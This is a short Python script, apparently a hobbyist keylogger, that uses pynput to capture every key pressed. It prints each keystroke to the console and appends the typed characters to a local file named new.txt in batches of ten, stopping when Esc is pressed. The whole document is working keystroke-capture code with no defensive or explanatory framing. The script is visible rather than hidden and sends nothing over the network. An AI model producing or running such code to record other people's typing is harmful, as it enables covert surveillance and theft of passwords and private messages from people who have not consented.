import pynput 
from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
    global keys,count

    keys.append(key)
    count += 1
    print('{0} pressed'.format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = [] 

def write_file(keys):
    with open("new.txt", "a") as f: # The file that will be saved
        for key in keys:
            k = str(key).replace("'","")
            #Key.space
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            


def on_release(key):
    if key == Key.esc:
        return False 

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()